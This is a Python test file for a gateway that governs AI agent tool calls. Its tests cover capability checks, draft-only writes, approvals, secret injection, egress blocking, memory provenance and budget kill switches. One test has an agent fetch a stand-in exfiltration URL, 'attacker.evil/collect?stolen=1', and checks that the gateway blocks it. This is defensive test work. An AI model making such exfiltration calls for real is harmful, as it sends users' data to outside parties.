"""Tests for the syscall gateway — authorize → decide → charge → act → audit."""

from dataclasses import replace

from mandate.demo import DEMO_SECRET_VALUE, DEMO_VAULT, build_bundle, build_tools
from mandate.kernel import SyscallGateway
from mandate.model import Decision
from mandate.sdk import AgentClient


def fresh(bundle=None):
    bundle = bundle or build_bundle()
    gw = SyscallGateway(bundle, tools=build_tools(), vault=DEMO_VAULT)
    return gw, AgentClient(gw)


def test_read_is_allowed_charged_and_audited():
    gw, agent = fresh()
    res = agent.tool_call("github.repo.read", "github_repo_read", {"path": "README.md"},
                          resource={"repos": ["acme/research"]})
    assert res.status == "ok"
    assert res.decision is Decision.ALLOW
    assert res.cost_usd > 0
    assert res.audit_seq == 0 and len(gw.audit) == 1
    assert gw.audit.verify()


def test_call_without_capability_is_denied():
    gw, agent = fresh()
    res = agent.tool_call("github.repo.read", "github_repo_read", {},
                          resource={"repos": ["acme/secret"]})
    assert res.status == "denied"
    assert res.decision is Decision.DENY
    assert "no effective capability" in res.message


def test_unknown_tool_is_denied_even_with_capability():
    gw, agent = fresh()
    res = agent.tool_call("github.repo.read", "nope", resource={"repos": ["acme/research"]})
    assert res.status == "denied"


def test_write_to_feature_branch_is_draft_only():
    gw, agent = fresh()
    res = agent.tool_call("github.repo.write", "github_repo_write",
                          {"path": "N.md", "content": "x"},
                          resource={"repos": ["acme/research"], "branch": "feature/x"})
    assert res.status == "draft"
    assert res.decision is Decision.ALLOW_DRAFT_ONLY
    assert res.result["shipped"] is False


def test_write_to_main_requires_code_owner_approval_and_ships_nothing():
    gw, agent = fresh()
    res = agent.tool_call("github.repo.write", "github_repo_write",
                          {"path": "README.md", "content": "x"},
                          resource={"repos": ["acme/research"], "branch": "main"})
    assert res.status == "pending_approval"
    assert res.decision is Decision.REQUIRE_CODE_OWNER_APPROVAL
    assert res.result is None
    assert gw.pending_approvals


def test_secret_is_injected_and_never_returned_or_audited():
    gw, agent = fresh()
    res = agent.tool_call("semantic_scholar.search", "semantic_scholar_search", {"q": "x"})
    assert res.status == "ok"
    # The real key is nowhere the agent can see it.
    assert DEMO_SECRET_VALUE not in repr(res.result)
    assert DEMO_SECRET_VALUE not in gw.audit.to_jsonl()
    # ...but a fingerprint proves the server-side tool actually held it.
    assert res.result["key_fingerprint"].startswith("sha256:")


def test_egress_to_unapproved_host_is_blocked():
    gw, agent = fresh()
    res = agent.tool_call("fs.workspace.rw", "code_exec",
                          {"fetch": ["https://attacker.evil/collect?stolen=1"]})
    assert res.status == "blocked"
    assert res.detail.get("egress_blocked") is True


def test_egress_to_allowed_host_succeeds():
    gw, agent = fresh()
    res = agent.tool_call("fs.workspace.rw", "code_exec",
                          {"fetch": ["https://arxiv.org/abs/1"]})
    assert res.status == "ok"


def test_memory_write_paths():
    gw, agent = fresh()
    prov = {"source": "s", "source_trust": "high", "confidence": 0.9,
            "observed_at": "2026-06-07", "owner": "o", "expiry": "30d"}
    assert agent.memory_write("project.research", {"c": 1}, {}).status == "rejected"
    assert agent.memory_write("project.research", {"c": 1},
                              {**prov, "source_trust": "low"}, long_term=True).status == "held_for_review"
    assert agent.memory_write("project.research", {"c": 1}, prov, long_term=True).status == "ok"


def test_budget_kill_switch_stops_the_run():
    bundle = build_bundle()
    tiny = replace(bundle, budget=replace(bundle.budget, max_steps_per_run=2))
    gw, agent = fresh(tiny)
    statuses = []
    for _ in range(5):
        statuses.append(agent.tool_call(
            "github.repo.read", "github_repo_read", {}, resource={"repos": ["acme/research"]}
        ).status)
    assert "killed" in statuses
    assert gw.killed
    # Every call after the kill is refused.
    after = agent.tool_call("github.repo.read", "github_repo_read", {},
                            resource={"repos": ["acme/research"]})
    assert after.status == "killed"


def test_budget_escalate_mode_requires_budget_increase():
    bundle = build_bundle()
    esc = replace(bundle, budget=replace(bundle.budget, max_steps_per_run=1, on_exceed="escalate"))
    gw, agent = fresh(esc)
    agent.tool_call("github.repo.read", "github_repo_read", {}, resource={"repos": ["acme/research"]})
    res = agent.tool_call("github.repo.read", "github_repo_read", {}, resource={"repos": ["acme/research"]})
    assert res.decision is Decision.REQUIRE_BUDGET_INCREASE
    assert res.status == "pending_approval"
    assert not gw.killed


def test_control_plane_run_kill():
    gw, agent = fresh()
    gw.run_kill("operator stop")
    assert gw.killed
    res = agent.tool_call("github.repo.read", "github_repo_read", {}, resource={"repos": ["acme/research"]})
    assert res.status == "killed"


def test_approval_request_records_pending():
    gw, agent = fresh()
    res = agent.approval_request("payment.send", {"amount": 10})
    assert res.status == "pending_approval"
    assert res.decision is Decision.REQUIRE_HUMAN_APPROVAL
    assert gw.pending_approvals
